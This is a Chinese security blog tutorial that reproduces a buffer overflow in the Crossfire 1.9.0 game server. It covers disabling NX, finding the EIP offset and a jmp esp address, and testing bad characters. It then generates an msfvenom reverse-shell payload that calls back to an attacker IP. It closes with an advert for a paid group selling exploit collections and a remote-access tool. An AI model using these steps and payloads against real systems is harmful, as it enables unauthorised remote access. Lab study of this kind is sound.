#  经典漏洞复现：CrossFire老版本缓冲区溢出漏洞GetShell全解析   
原创 Z1eaf  泷羽Sec-Z1eaf   2025-02-10 15:24  
  
# 背景  
  
前面我们学习了利用Windows32位系统的缓冲区溢出漏洞来getshell，今天我们来利用Linux32位系统的缓冲区溢出漏洞来getshell，进一步学习和理解缓冲区溢出漏洞  
- 首先，我们这次需要准备一个Linux32位系统镜像，记得拍好快照，避免操作过程中造成系统崩溃。  
  
- 接着，我们需要准备好crossfire  
，即我们耳熟能详的穿越火线，这是一个基于Linux系统的在线多人角色的FPS游戏，这次漏洞是产生在历史版本1.9.0  
  
- 不论是游戏，还是程序，它们都需要端口进行交互，我们知道缓冲区溢出的本质还是因为内存，所以我们要明白哪些命令会经过内存空间。而setup sound  
这一条命令是会经过内存空间的  
  
# 准备  
## 安装调试工具  
  
这次我们需要使用到的调试工具是：EDB  
。  
```
sudo apt update #更新软件库
edb #直接注入edb，系统会帮助你下载

```  
## crossfire源码准备  
### 下载源码  
  
网址：https://sourceforge.net/projects/crossfire/files/crossfire-server/1.9.0/  
### 解压游戏包  
```
tar -zvf crossfire.tar.gz

```  
### 执行程序  
  
进入你们游戏包的目录，执行程序  
```
sudo cp -r crossfire /usr/games/ #拷贝文件到系统目录
cd /usr/games/crossfire/bin #进入游戏包的bin文件夹
./crossfire # 允许游戏程序

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rY3DHGcSQmR2KI4AmF2JY9fRaVpkvITicvjpUvQGNdZT1PFib5NicAicWicoibfIbhpqXD82DSG1iayxsIB6aLPZEdc5g/640?wx_fmt=png&from=appmsg "")  
### 验证端口  
  
一旦程序运行，它就会占用一个端口，我们要验证是否有端口被crossfire占用  
```
ss -pantulo|grep crossfire

```  
  
OK，我们可以看到端口占用为：13327![](https://mmbiz.qpic.cn/mmbiz_png/rY3DHGcSQmR2KI4AmF2JY9fRaVpkvITiccMHJObQmx7h70P1AUlP2JNPBw590P5A1OeSnIvIbr51YwMzmbmicP3g/640?wx_fmt=png&from=appmsg "")  
  
## 检查防护机制  
  
为了保证shell成功反弹，我们先将一些防护机制关闭。 先使用checksec  
这个脚本工具来看看这个程序是否开启安全防护机制。  
```
sudo apt install checksec #下载脚本工具 
sudo checksec --file=/usr/games/crossfire/bin/crossfire # 检查程序

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rY3DHGcSQmR2KI4AmF2JY9fRaVpkvITicotWqedcjOaFY72a9BYPOXUyL55nMFXdqt08IGQSHkjtobPlvTY3vSA/640?wx_fmt=png&from=appmsg "")  
我们可以看到NX  
是开启的，其他的防护机制是关闭的。  
## 关闭NX  
### 方法一  
  
首先，我们重新启动kali 32位系统，然后再进入系统页面是按E  
，接着编辑引导过程参数。  
  
我们先找到linux  
开头的那一个参数选项，然后输入下面指令：  
```
noexec=off

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rY3DHGcSQmR2KI4AmF2JY9fRaVpkvITicfichspHxgOiaf1jZRalKM4Ce731DFdvoY5Tq3ZHvzRDUYrkuMHvOsftA/640?wx_fmt=png&from=appmsg "")  
  
接着，ctrl+x  
进入系统，  
### 方法二  
  
通过内核启动参数禁用 NX  
  
1.编辑 GRUB 配置文件：  
```
sudo vim /etc/default/grub

```  
  
2.在 GRUB_CMDLINE_LINUX 中添加参数：  
```
GRUB_CMDLINE_LINUX="... noexec=off"

```  
  
3.更新 GRUB 配置：  
```
sudo update-grub

```  
  
4.重启系统：  
```
sudo reboot

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rY3DHGcSQmR2KI4AmF2JY9fRaVpkvITicDCkt4Me9vgGLiajHbF1E9ZT6ia02HHTibKfUibgzM1ib2bM1Q8SRZRLeribw/640?wx_fmt=png&from=appmsg "")  
### 查看NX是否关闭  
  
检查 CPU 是否支持 NX：  
```
grep -w nx /proc/cpuinfo #输出含 "nx" 表示支持

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rY3DHGcSQmR2KI4AmF2JY9fRaVpkvITicBprQS5Z2UuPGlBKjodavF3CVzRaWjapGRRZpJ5Sq99VFfArhWe1uHw/640?wx_fmt=png&from=appmsg "")  
# 导入程序  
  
完成一切准备工作后，我们就可以对其进行测试了。  
  
1.先启动程序  
```
cd /usr/games/crossfire/bin
./crossfire

```  
  
2.导入程序进程 打开edb  
，点击左上角file  
中的attack  
，导入我们的crossfire  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rY3DHGcSQmR2KI4AmF2JY9fRaVpkvITiclKqVfk6TqYHros1RdWDwMFIQ4Tpeib92oQnro6Fvh6fNSf6VXJSXV8A/640?wx_fmt=png&from=appmsg "")  
  
导入成功，同时现在是暂停状态，先让程序跑起来了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rY3DHGcSQmR2KI4AmF2JY9fRaVpkvITicibibEfGsPCHRxbjHw2icAIlmVSzmT363U0whyH2sV3iaDEJKkVGyEQ35UQ/640?wx_fmt=png&from=appmsg "")  
# 验证漏洞存在  
  
前面我们说过，如果命令经过内存，那我们就可以验证一下命令当中是否存在缓冲区溢出漏洞  
。  
  
本次漏洞复现我们使用的的setup sound  
命令.  
  
现在先使用脚本1向程序运行占用的端口13327  
发送5000个A，目的是验证漏洞是否存在，如果漏洞存在，那程序就会崩溃。  
  
脚本1：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rY3DHGcSQmR2KI4AmF2JY9fRaVpkvITicCBYOyvPG9HY7n1OQCB831IykeXj5VykXECnX5TwojaY46ItQiaqpiaaA/640?wx_fmt=png&from=appmsg "")  
  
执行脚本  
```
python2 exp01.py

```  
  
程序崩溃  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rY3DHGcSQmR2KI4AmF2JY9fRaVpkvITicK4bFRUAykYWhJCSoic9M4icicIMSKEzy8SSGzOR4ptGYW4MQnrwmtpQsg/640?wx_fmt=png&from=appmsg "")  
  
我们看看程序的寄存器的情况  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rY3DHGcSQmR2KI4AmF2JY9fRaVpkvITicjFLETpXZkuY1v0TCmbWhVct5LQcQiaiaNfjLxSQ1Yk2XJoLh06y53QQg/640?wx_fmt=png&from=appmsg "")  
诶，我们发现一个问题：EIP地址没有被41414141  
覆盖，也就是意味着没有被5000个A覆盖。这是因为我们注入的数据过多，导致程序崩溃后EIP  
寄存器地址也不会放置41414141  
即四个A，这是这个程序比较特殊的地方。  
  
那我们就只能一次次试错，使用脚本2一次次发送各个数量的A，最终确定能覆盖EIP  
寄存器的数据量为：4379  
。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rY3DHGcSQmR2KI4AmF2JY9fRaVpkvITicSPdibib9mzOuDYbGCyzttLhvL73Zicd6pgibfGauFKrzh7rbPf5Lv9AM6w/640?wx_fmt=png&from=appmsg "")  
# 确定偏移量  
  
我们成功让EIP  
寄存器的地址被覆盖为41414141  
，那现在先使用msf的一个模块生成不重复的4379  
个字符，目的是通过特定标识确定EIP的地址。  
```
msf-pattern_create -l 4379

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rY3DHGcSQmR2KI4AmF2JY9fRaVpkvITicUWaIgDqxYMlWhicsSMIGjOmMEaQS6MTFLaz7D11SBYryf5Dt8ibAiaFAQ/640?wx_fmt=png&from=appmsg "")  
  
现在，使用脚本3将这些数据发送到这个程序的端口，看看EIP  
被覆盖成什么。  
  
我们可以看到EIP  
地址被覆盖为：46367046  
![](https://mmbiz.qpic.cn/mmbiz_png/rY3DHGcSQmR2KI4AmF2JY9fRaVpkvITicLnFzYUdkB7GBibHdKPKOwAve2p10fAeSm1yNkNvdYHIvjVH7FKVbKuQ/640?wx_fmt=png&from=appmsg "")  
  
  
接下来还是使用msf的一个模块去推出偏移量：  
```
msf-pattern_offset -q 46367046

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rY3DHGcSQmR2KI4AmF2JY9fRaVpkvITicO0wrsRicsrX08hicFC7IuBHQYTNnVLae6vy5GCNibqth15uktheUS0ZgQ/640?wx_fmt=png&from=appmsg "")  
  
得到偏移量为4368  
# 确定EIP地址  
  
我们测试出偏移量，那现在就开始找EIP寄存器  
的精确地址，我们使用脚本4发送一段总字符数为4379  
数据：4368个A，4个B,7个C  
  
脚本4：![](https://mmbiz.qpic.cn/mmbiz_png/rY3DHGcSQmR2KI4AmF2JY9fRaVpkvITicDRRKkf5Y8PLc95EuOrID99kE2FMFQaJlLx9reqGMWZnK6Iojh85pRg/640?wx_fmt=png&from=appmsg "")  
  
  
执行脚本后，查看寄存器情况  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rY3DHGcSQmR2KI4AmF2JY9fRaVpkvITicqasPBicdibhOBibMx243cEVd6U6fkDWWia55Goh71fqUW9BmG3NiacFmGUw/640?wx_fmt=png&from=appmsg "")  
我们看到EIP寄存器  
被覆盖为：42424242；那么我们就可以确定EIP的精确地址  
了。  
# 发现问题  
  
不知道各位有没有发现一个问题：ESP寄存器  
没有可覆盖空间供payload写入，因为只能写入7个字节，超出7个字节就无法使用了。  
  
观察其他几个寄存器：EAX  
、ECX  
、EDX  
，这几个寄存器是有数据覆盖的，那EAX  
可以吗？实际上，EAX  
覆盖的起始地址有setup sound  
存在，这个字符串有可能影响我们playload的执行，而且这个寄存器中jmp esp  
指令出现的可能性不高。  
# 解决问题  
  
**那我们换个思路，我们利用ESP寄存器的7个字符的空间来进行操作，既然EAX寄存器的setup sound有可能影响playload执行，那我们选择在setup sound的前面进行。**  
## 步骤  
### 第一步  
  
首先，我们在ESP寄存器  
中注入汇编指令：add eax,12 jmp eax  
。  
#### 解释：  
- add eax, 12  
 是一条汇编指令。其中，add 是加法操作指令，eax 是 x86 架构下的一个通用寄存器（累加器寄存器），这条指令的作用是把寄存器 eax 里的值加上 12，然后把结果存回 eax 寄存器。用伪代码表示就是：eax = eax + 12。  
  
- 为什么是12？因为setup sound  
刚好就是12.  
  
- jmp eax  
：jmp eax 也是一条汇编指令。jmp 是无条件跳转指令，其功能是让程序的执行流程跳转到指定的地址。这里指定的地址存于寄存器 eax 中，也就是说程序会跳转到 eax 所存储的地址处继续执行后续的指令。  
  
这些指令组合是为了在找到 JMP ESP 指令地址后，把这个地址存储到 eax 寄存器，接着通过 add eax, 12 对地址进行微调，最后使用 jmp eax 跳转到调整后的地址，以此来控制程序的执行流程  
  
**将汇编指令转化为十六进制**  
```
msf-nasm_shell

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rY3DHGcSQmR2KI4AmF2JY9fRaVpkvITicGCCs9PMgV9IVK2ZIvLn8qv9m4HTH42r9D9Q6UYzPVbhKtkHnlrcBvw/640?wx_fmt=png&from=appmsg "")  
  
add eax,12为83C00C  
，jmp eax为FFE0  
。  
  
将指令写入脚本5中，替代原来C的位置  
### 第二步  
  
接下来，我们要找到能够存在jmp esp  
指令的程序中指令存在的位置。 先进入opcodesearcher  
模块![](https://mmbiz.qpic.cn/mmbiz_png/rY3DHGcSQmR2KI4AmF2JY9fRaVpkvITicDgO8ogia7LGUh9AS3h3poRGDpRibmVWQicGvTDLF80KPMzZPPZicq4ILicA/640?wx_fmt=png&from=appmsg "")  
  
  
先选择ESP->EIP  
，然后选择有执行权限的crossfire进程（r-x）  
，接着点击find  
。（选择ESP->EIP  
是因为把jmp esp  
这条指令所在的内存地址放在EIP寄存器  
）  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rY3DHGcSQmR2KI4AmF2JY9fRaVpkvITick92jiaWT2UytaP7wCWX1XyRZYA3nt6bIPPDHwqbXryMBuNvSBmMp3Qg/640?wx_fmt=png&from=appmsg "")  
  
然后就会回显搜索到的多个jmp esp  
指令，我们随便选择一个：0x08134596  
  
将脚本5的B的位置，即EIP位置  
替换成08134596  
，但使用了一个小端序的地址，所以要进行倒着写：  
```
eip = "\x96\x45\x13\x08"

```  
  
脚本6：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rY3DHGcSQmR2KI4AmF2JY9fRaVpkvITicia9a9bMNCk54s7uQFPJdKtfEv7uAkyfYbnB1OOx6dzXQK2ibfLpQthvw/640?wx_fmt=png&from=appmsg "")  
# 测试坏字符  
### （1）什么是坏字符  
  
在计算机安全和编程中，“坏字符”（Bad Characters）通常是指那些在特定上下文中可能导致程序行为异常、触发错误或被程序逻辑所禁止的字符。  
  
在网络安全和缓冲区溢出攻击中，“坏字符”是指那些可能破坏攻击载荷（payload）或导致程序崩溃的字符  
  
例如：  
- **空字符（0x00）**  
：通常用于字符串终止，可能会截断攻击载荷。  
  
- **换行符（0x0A）或回车符（0x0D）**  
：可能触发协议解析错误。  
  
- **其他特殊字符**  
：某些协议或程序可能对特定字符有特殊用途，这些字符如果出现在攻击载荷中，可能会导致攻击失败。  
  
### （2）注入坏字符  
  
将所有的十六进制字符注入后，如果遇到坏字符，数字就会变成00。按照这个规则，我们就可以对照输入的十六进制字符找到坏字符，即：\x00\x20  
。  
  
脚本7：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rY3DHGcSQmR2KI4AmF2JY9fRaVpkvITicbvstJEWaZKZQPkgN9hHGYzCwfFYeuWzWsLUENAVVIew19tXk7OSXIg/640?wx_fmt=png&from=appmsg "")  
# 反弹shell  
  
最后一步，我们使用msf生成实现反弹shell的代码  
```
msfvenom -p linux/x86/shell_reverse_tcp LHOSt=192.168.159.129 LPORT=4444 -f c -b "\x00\x20" -f py

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rY3DHGcSQmR2KI4AmF2JY9fRaVpkvITic1all6mqo6COveDKIfGu9AIo5CibibdAxsTOJzicGN4twy1tJLBF4iaSGEQ/640?wx_fmt=png&from=appmsg "")  
  
在攻击机端口监听  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rY3DHGcSQmR2KI4AmF2JY9fRaVpkvITiciakO5kfRU4sGgJpuT4q3CQo3Z6OL8g0ByLiaVCtrVyyk80ABau1tAwpg/640?wx_fmt=png&from=appmsg "")  
  
运行crossfire程序后，执行反弹shell脚本  
```
python exp08.py

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rY3DHGcSQmR2KI4AmF2JY9fRaVpkvITica4sXiaRdBeSPF51ZBJWboruAzxTovvYuaK594sgXnQ7pycjG8zlMtfA/640?wx_fmt=png&from=appmsg "")  
  
成功反弹shell![](https://mmbiz.qpic.cn/mmbiz_png/rY3DHGcSQmR2KI4AmF2JY9fRaVpkvITicp0HRYhl55lx4kFEOWwiagfOZxiaAtQCuy3Ju8ofa7EumibUpQM2pQicia0g/640?wx_fmt=png&from=appmsg "")  
  
# 资源分享  
## 帮会分享  
  
欢呼各位热爱网络安全的师傅们加入我们的帮会。是真正的红队大佬创建的，里面会定时丢些网上没有的工具（比如安卓远控7.4，不过现在已经删除了，有时限，加入的记得看好时间），现在只要99就可以终身，后面人多了就会涨价了  
  
其中：有大量关于网络安全的电子书籍，各个帮会成员全网收集的各付费网安学习资料、计算机考研资料等等  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/rY3DHGcSQmTHxgB4ZUG26C9PUBibP1yALbYmaufYbF6PMOfduH9bmzSiaO6kiaa7SJMCtaJVfiblwxsl0iagicLYVRVg/640?wx_fmt=webp&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/rY3DHGcSQmTHxgB4ZUG26C9PUBibP1yALbYmaufYbF6PMOfduH9bmzSiaO6kiaa7SJMCtaJVfiblwxsl0iagicLYVRVg/640?wx_fmt=webp&from=appmsg "")  
  
  
还有大量最新公开、内部整理5000+POC合集，优质渗透利用工具。   
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/rY3DHGcSQmTHxgB4ZUG26C9PUBibP1yALyRibZ63v3oHUgNCKuFp19mogWKzJtupx2YNpzKnvD1WdMwYgfat4ppw/640?wx_fmt=webp&from=appmsg "")  
  
  
进入帮会更多精彩内容，优质工具。   
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/rY3DHGcSQmT3n2j7L4K0QzWgloDs0PP5ftJ4p4ibMcFibLGWvVpwUE0SzLHwEDYCb7dbiapdMRnRsWxgeDPjVUuoQ/640?wx_fmt=jpeg "")  
  
  
